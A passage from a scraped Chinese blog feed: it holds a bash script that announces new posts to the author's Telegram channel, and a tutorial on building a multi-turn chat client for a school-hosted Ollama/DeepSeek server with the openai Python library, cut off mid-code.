class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">TG_BOT_TOKEN=xxxx</span><br><span class="line">ChatID=xxxxx</span><br><span class="line">path=xxxxx</span><br><span class="line">currentTime=$(date +&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">flag=false</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">URL 编码函数</span></span><br><span class="line">urlencode() &#123;</span><br><span class="line">    local length=&quot;$&#123;#1&#125;&quot;</span><br><span class="line">    local i=0</span><br><span class="line">    local c</span><br><span class="line">    local encoded=&quot;&quot;</span><br><span class="line">    while [ $i -lt $length ]; do</span><br><span class="line">        c=&quot;$&#123;1:$i:1&#125;&quot;</span><br><span class="line">        # 使用 iconv 检查字符是否为中文</span><br><span class="line">        if echo &quot;$c&quot; | iconv -f UTF-8 -t ISO-8859-1 &gt;/dev/null 2&gt;&amp;1; then</span><br><span class="line">            case $c in</span><br><span class="line">                [a-zA-Z0-9.~_-]) encoded+=&quot;$c&quot; ;;</span><br><span class="line">                *) encoded+=$(printf &#x27;%%%02X&#x27; &quot;&#x27;$c&quot;) ;;</span><br><span class="line">            esac</span><br><span class="line">        else</span><br><span class="line">            encoded+=&quot;$c&quot;</span><br><span class="line">        fi</span><br><span class="line">        ((i++))</span><br><span class="line">    done</span><br><span class="line">    echo &quot;$encoded&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addUpdate() &#123;</span><br><span class="line">    local commitMsg=&quot;$1&quot;</span><br><span class="line">    local title=&quot;$2&quot;</span><br><span class="line">    local addrlink=&quot;$3&quot;</span><br><span class="line">    local link=&quot;https://blog.gubaiovo.com/posts/$addrlink.html&quot;</span><br><span class="line">    commitMsg+=$(printf &quot;\nTitle: %s\nURL: %s\n&quot; &quot;$title&quot; &quot;$link&quot;)</span><br><span class="line">    commitMsg+=$(printf &quot;\n————————————————&quot;)</span><br><span class="line">    echo &quot;$commitMsg&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">commitMsg=&quot;</span><br><span class="line">————————————————</span><br><span class="line">main: https://www.gubaiovo.com</span><br><span class="line">blog: https://blog.gubaiovo.com</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">Time: $&#123;currentTime&#125;</span><br><span class="line"></span><br><span class="line">——————UPDATE——————</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">for file in &quot;$path&quot;/*; do</span><br><span class="line">    # 获取文件的前20行</span><br><span class="line">    fileContent=$(head -n 20 &quot;$file&quot;)</span><br><span class="line">    push=$(echo &quot;$fileContent&quot; | grep &#x27;push:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">    if [ &quot;$push&quot; == &quot;true&quot; ]; then</span><br><span class="line">        flag=true</span><br><span class="line">        # 提取 title 和 abbrlink</span><br><span class="line">        title=$(echo &quot;$fileContent&quot; | grep &#x27;title:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        addrlink=$(echo &quot;$fileContent&quot; | grep &#x27;abbrlink: &#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        encodedTitle=$(urlencode &quot;$title&quot;)</span><br><span class="line">        commitMsg=$(addUpdate &quot;$commitMsg&quot; &quot;$encodedTitle&quot; &quot;$addrlink&quot;)</span><br><span class="line">        sed -i &#x27;s/push: false/push: false/&#x27; &quot;$file&quot;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">if [ &quot;$flag&quot; == false ]; then</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line">curl -s -X POST https://api.telegram.org/bot$&#123;TG_BOT_TOKEN&#125;/sendMessage -d chat_id=$ChatID -d text=&quot;$commitMsg&quot;</span><br></pre></td></tr></table></figure><p>顾白的tg频道 <a href="https://t.me/gubaiblog">https://t.me/gubaiblog</a></p>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ollama API &amp; DeepSeek API 综合利用</title>
      <link href="/posts/693deb78.html"/>
      <url>/posts/693deb78.html</url>
      
        <content type="html"><![CDATA[<h1>Ollama API &amp; DeepSeek API 综合利用</h1><blockquote><p>小道消息知道学校拿ollama跑满血deepseek r1和v3，但是学校没有做ui，ds官方api也不能完全用到ollama上，于是自己探索了下ollama api文档，初步实现多轮交互、历史记录查询</p></blockquote><p><a href="https://api-docs.deepseek.com/zh-cn/">deepseek api文档</a></p><p><a href="https://www.llamafactory.cn/ollama-docs/">ollama api文档中文翻译</a></p><h2 id="环境">环境</h2><p><strong>工具</strong>：python+ide，一个能发各种请求的工具(这里用的 <a href="https://insomnia.rest/download">Insomnia</a> )</p><p>核心python库：<strong>openai</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install openai</span><br></pre></td></tr></table></figure><p>deepseek 兼容 openai，ollama 也兼容 openai，所以用 openai 发请求比直接发 post 方便很多</p><h2 id="创建客户端">创建客户端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(api_key=<span class="string">&quot;666&quot;</span>, base_url=<span class="string">&quot;http://xx.xx.xx.xx:11434/v1&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>api_key</code> 是令牌内容，本地部署的 ollama 一般没有令牌限制，所以可以随意填</p><p><code>base_url</code> 是目标ollama所在服务器ip，<code>11434</code> 为ollama默认端口，<code>/v1</code> 是根据deepseek api描述，用来兼容openai。原文如下</p><blockquote><p>出于与 OpenAI 兼容考虑，您也可以将 <code>base_url</code> 设置为 <code>https://api.deepseek.com/v1</code> 来使用，但注意，此处 <code>v1</code> 与模型版本无关。</p></blockquote><h2 id="确定模型信息">确定模型信息</h2><blockquote><h4 id="列出本地模型">列出本地模型</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/tags</span><br></pre></td></tr></table></figure><h4 id="显示模型信息">显示模型信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /api/show</span><br></pre></td></tr></table></figure></blockquote><p>首先 GET 查看有哪些模型（这一步可以不用请求工具，直接访问 <code>/api/tags</code> 也会有回显）</p><p><img src="/assets/post_img/dev/Ollama_API_&amp;_DeepSeek_API_%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/model_list.png" alt="image-20250217195231884"></p><p>可以看到这台机子跑了一个 <code>deepseek-v3:latest</code>，参数 671b</p><p>(可选)查看模型信息</p><p>发送 post 到 <code>/api/show</code></p><p>body填入：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;model&quot;</span><span class="punctuation">:</span> <span class="string">&quot;要查询的模型&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>会得到非常长的一个响应，模型主要信息在下面</p><p><img src="/assets/post_img/dev/Ollama_API_&amp;_DeepSeek_API_%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/model_info.png" alt="image-20250217195510361"></p><h2 id="简单对话测试">简单对话测试</h2><p>确定好模型信息，就可以向 <code>/api/chat</code> 发一个简单的对话测试了。可以通过post发送，也可以python发送</p><h3 id="POST">POST</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;model&quot;</span><span class="punctuation">:</span> <span class="string">&quot;deepseek-v3:latest&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;messages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;system&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你是一名高级Java程序员，擅长处理各种BUG以及编写高质量代码&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;请帮我使用Java写一个HelloWorld示例&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;temperature&quot;</span><span class="punctuation">:</span> <span class="number">0.2</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>model</code> 填入目标模型名(必填)</p><p><code>messages</code> 为发送的内容</p><ul class="lvl-0"><li class="lvl-2"><p><code>role</code> 为角色。<code>system</code> 可以直接理解为人设，<code>user</code> 可以直接理解为用户。这里的写法和 ollama 的 Modelfile 很相似。</p></li><li class="lvl-2"><p><code>content</code> 代表内容</p></li></ul><p><code>stream</code> 为是否启用字节流。启用字节流的效果为将输出分为多个数据块，也就是ai边想边输出。不启用则为ai响应完毕后，将内容合并一整块返回</p><p><code>options</code> 为一些附加选项，可以不写此项。这里写的 <code>temperature</code> 可以认为 “严肃程度”，这个值越高，得到的内容越丰富(发散)</p><p>还有一些选项，可以完全按照 ollama 的 Modelfile 填写</p><p>发送post请求响应可能会很久，但是Insomnia默认超过30s就是请求超时，所以需要调整一下最大等待时间</p><p>Insomnia右上角 <code>Application</code> → <code>Preferences</code> 进入 <code>General</code> 选项卡，下滑，将 <code>Request timeout</code> 改为0(即为不限制超时)</p><p><img src="/assets/post_img/dev/Ollama_API_&amp;_DeepSeek_API_%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/preferences.png" alt="image-20250217201332940"></p><p>现在尝试发送请求</p><p>stream true：</p><p><img src="/assets/post_img/dev/Ollama_API_&amp;_DeepSeek_API_%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/test_stream.png" alt="image-20250217201511278"></p><p>stream false：</p><p><img src="/assets/post_img/dev/Ollama_API_&amp;_DeepSeek_API_%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/test_stream2.png" alt="image-20250217201653861"></p><p>ai 可以正常回显，接下来尝试python发送请求(openai)</p><h3 id="python">python</h3><h4 id="非流式">非流式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(api_key=<span class="string">&quot;666&quot;</span>, base_url=<span class="string">&quot;http://xx.xx.xx.xx:11434/v1&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-v3:latest&quot;</span>,</span><br><span class="line">    messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Hello&quot;</span>&#125;,</span><br><span class="line">    ],</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.choices[<span class="number">0</span>].message.content)</span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/Ollama_API_&amp;_DeepSeek_API_%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/python_test.png" alt="image-20250217202528348"></p><h4 id="流式">流式</h4><p>和非流式的输出有所不同，需要添加一个循环，逐个打印字节流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(api_key=<span class="string">&quot;666&quot;</span>, base_url=<span class="string">&quot;http://xx.xx.xx.xx:11434/v1&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-v3:latest&quot;</span>,</span><br><span class="line">    messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Hello&quot;</span>&#125;,</span><br><span class="line">    ],</span><br><span class="line">    stream=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> chunk <span class="keyword">in</span> response:</span><br><span class="line">    <span class="built_in">print</span>(chunk.choices[<span class="number">0</span>].delta.content, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里的 <code>chunk</code> 是 openai 中的 “块”，参考上方 POST 发送流式请求，chunk代表每一个数据块。</p><p><code>choices</code>是 openai 响应中的第一个 <code>choice</code> 对象。<code>choices</code>是一个列表，包含了包含增量更新的内容。</p><blockquote><p>也许会疑惑，在上面的 post 请求中没有看到choices和delta，他们是从哪来的</p><p>实际上这是openai的问题，我们使用的是兼容openai的 /v1 端点，实际上，请求发送到了 /v1/chat/completions</p><p>为了进一步探究这个问题，我们可以向 /v1/chat/completions 发送 post</p><p><img src="/assets/post_img/dev/Ollama_API_&amp;_DeepSeek_API_%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/why_delta.png" alt="image-20250217203822560"></p><p>单独看一个数据块</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;chatcmpl-977&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="string">&quot;chat.completion.chunk&quot;</span><span class="punctuation">,</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="number">1739795748</span><span class="punctuation">,</span><span class="attr">&quot;model&quot;</span><span class="punctuation">:</span><span class="string">&quot;deepseek-v3:latest&quot;</span><span class="punctuation">,</span><span class="attr">&quot;system_fingerprint&quot;</span><span class="punctuation">:</span><span class="string">&quot;fp_ollama&quot;</span><span class="punctuation">,</span><span class="attr">&quot;choices&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;index&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;delta&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;assistant&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;当然&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;finish_reason&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>稍微修正一下(去掉data:后json格式化)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chatcmpl-977&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chat.completion.chunk&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;created&quot;</span><span class="punctuation">:</span> <span class="number">1739795748</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;model&quot;</span><span class="punctuation">:</span> <span class="string">&quot;deepseek-v3:latest&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;system_fingerprint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fp_ollama&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;choices&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;delta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assistant&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;当然&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;finish_reason&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这样就很清楚了，这一整块就是所谓的 <code>chunk</code>，<code>choices[0]</code> 指的是第一组花括号的内容，delta.content就是这个字节流的内容。</p><p>于是，chunk.choices[0].delta.content 就可以访问到这个字节流的内容。由于print默认结尾为回车，需要指定为空字符来避免每个字节流都换行。最后的flush用来刷新缓冲区。</p><p>也许会有怀疑，这是真流式还是假流式，是真的ai一边想一边输出，还是主动将输出分割成一个个小块然后伪造流式输出的样子。其实可以比较输出时间，非流式输出响应时间很长很长，而流式输出响应很快。这里不做演示，可以自行尝试。</p></blockquote><h2 id="扩展上下文">扩展上下文</h2><p>多尝试几次简单对话可以发现，ai本身没有记忆上下文，每次都是新的对话</p><p>deepseek api文档对此也有介绍：</p><blockquote><p>DeepSeek <code>/chat/completions</code> API 是一个“无状态” API，即服务端不记录用户请求的上下文，用户在每次请求时，<strong>需将之前所有对话历史拼接好后</strong>，传递给对话 API。</p></blockquote><p>文档中保持上下文的示例：</p><blockquote><p>在<strong>第一轮</strong>请求时，传递给 API 的 <code>messages</code> 为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;What&#x27;s the highest mountain in the world?&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>在<strong>第二轮</strong>请求时：</p><ol><li class="lvl-3"><p>要将第一轮中模型的输出添加到 <code>messages</code> 末尾</p></li><li class="lvl-3"><p>将新的提问添加到 <code>messages</code> 末尾</p></li></ol><p>最终传递给 API 的 <code>messages</code> 为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;What&#x27;s the highest mountain in the world?&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assistant&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The highest mountain in the world is Mount Everest.&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;What is the second?&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></blockquote><p>所以需要做的就是，记录每一次输入和输出作为 <code>old_message</code>，追加新的 <code>user content</code>，构成一个新的 <code>message</code> 发送给ai，记录 <code>ai content</code>，追加到 <code>message</code> 尾部，如此循环。</p><p>先定义一个初始message</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">messages = [&#123;</span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, </span><br><span class="line">    <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你需严格跟踪对话历史（位于[系统消息]之后），始终保持对话连贯性。响应时需主动关联先前讨论内容。&quot;</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><p>进入Q&amp;A循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;##user##: &quot;</span>)</span><br><span class="line">    </span><br><span class="line">    messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: user_input&#125;)</span><br><span class="line"></span><br><span class="line">    response = client.chat.completions.create(  <span class="comment"># 生成对话</span></span><br><span class="line">        model=<span class="string">&quot;deepseek-v3:latest&quot;</span>,</span><br><span class="line">        messages=messages,</span><br><span class="line">        stream=<span class="literal">True</span>     <span class="comment"># 流式对话</span></span><br><span class="line">    )</span><br><span class="line"><span class="comment"># 打印对话</span></span><br><span class="line"><span class="comment"># 添加对话记录</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用的是流式对话，参考上方流式对话示例，定义一个新的函数 <code>print_messages()</code> 用于打印流式响应内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_messages</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;##ds##: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(chunk.choices[<span class="number">0</span>].delta.content, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p>为了方便，将流式相应内容收集为一整个内容，在 <code>print_messages()</code> 内添加一个 <code>assistant_reply</code> 变量，每获取到新的字节流就追加，这样获得完整响应</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_messages</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;##ds##: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    assistant_reply = <span class="string">&quot;&quot;</span>  <span class="comment"># 收集各个chunk的回复</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(chunk.choices[<span class="number">0</span>].delta.content, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        assistant_reply += chunk.choices[<span class="number">0</span>].delta.content</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">return</span> assistant_reply</span><br></pre></td></tr></table></figure><p>这样继续修改程序，在循环中调用 <code>print_messages</code> 函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assistant_reply = print_messages(response) <span class="comment"># 打印对话</span></span><br></pre></td></tr></table></figure><p>在循环最后追加  <code>ai content</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: assistant_reply&#125;)</span><br></pre></td></tr></table></figure><p>完整程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(api_key=<span class="string">&quot;666&quot;</span>, base_url=<span class="string">&quot;http://xx.xx.xx.xx:11434/v1&quot;</span>) <span class="comment"># 创建客户端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_history</span>(<span class="params">messages</span>): <span class="comment"># 打印对话记录</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n--------------------history--------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> index, message <span class="keyword">in</span> <span class="built_in">enumerate</span>(messages):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;##<span class="subst">&#123;index&#125;</span>##: <span class="subst">&#123;message[<span class="string">&#x27;role&#x27;</span>]&#125;</span>: <span 